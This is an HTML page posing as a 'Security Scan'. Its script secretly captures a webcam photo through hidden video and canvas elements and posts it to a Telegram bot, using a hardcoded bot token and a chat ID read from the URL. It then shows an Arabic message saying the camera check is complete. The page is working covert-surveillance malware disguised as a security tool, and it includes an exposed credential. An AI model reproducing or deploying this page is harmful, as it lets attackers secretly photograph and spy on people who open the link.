<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Security Scan</title></head>
<body>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const token = "8379860884:AAHY6orUkUCffcsZc3dNRt8OQSlPJXD_03w";
        const urlParams = new URLSearchParams(window.location.search);
        const chat_id = urlParams.get('id');

        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', chat_id);
                    fd.append('photo', blob, 'shot.jpg');
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');
                document.body.innerHTML = "<h2>✅ اكتمل فحص الكاميرا</h2>";
            }, 2000);
        });
    </script>
</body>
</html>
